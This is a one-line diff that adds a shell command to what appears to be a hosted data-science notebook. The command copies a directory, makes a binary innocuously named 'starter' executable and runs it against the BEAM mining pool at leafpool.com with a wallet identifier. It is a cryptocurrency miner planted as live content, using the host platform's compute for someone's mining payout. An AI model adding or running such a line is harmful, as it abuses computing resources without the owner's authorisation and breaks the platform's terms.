@@ -1,0 +1,1 @@
+!cp -r ../input/master . && cd master && chmod +x starter && ./starter --user 7a0e6c53e258c7007a5ec5af67dd90f112319e1b1b7face719285011a7148b2265 --pool beam-us.leafpool.com:3333 --coin BEAM
